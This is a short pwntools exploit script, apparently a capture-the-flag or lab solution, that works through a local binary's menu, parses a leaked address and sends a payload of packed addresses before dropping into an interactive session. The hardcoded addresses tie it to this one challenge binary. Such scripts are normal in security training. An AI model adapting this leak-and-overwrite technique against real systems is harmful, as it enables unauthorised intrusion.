from pwn import *

context.log_level = "DEBUG"

p = process(["./aslrbp", "./3"])

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", b"4")

data = p64(int(p.recvline().split()[6], 16))
payload = p64(0x100008000) + data + p64(0x100000770)

p.sendlineafter(b"Write ", payload)
p.sendlineafter(b"> ", b"3")
p.interactive()
